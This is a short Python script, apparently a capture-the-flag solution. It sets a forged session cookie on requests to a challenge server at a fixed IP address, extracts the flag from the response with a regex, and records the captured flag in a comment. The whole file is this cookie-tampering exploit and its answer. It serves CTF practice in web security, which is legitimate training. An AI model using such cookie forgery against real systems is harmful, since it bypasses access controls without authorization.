#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-05-14 10:42:46
# @Last Modified by:   john
# @Last Modified time: 2016-05-14 10:54:03

import requests
import re

url= 'http://104.196.9.105:9090/splash'
s = requests.Session()
s.cookies.update({'ctfcookie':'ebd555acecf09b3c034874fe368fb52b&pain'})

r = s.get('http://104.196.9.105:9090/splash')
print re.findall('Flag=(.*)</', r.text)[0]

# Flag={f33l_mypain11111}
# HOPE TO WASTE YOUR TIME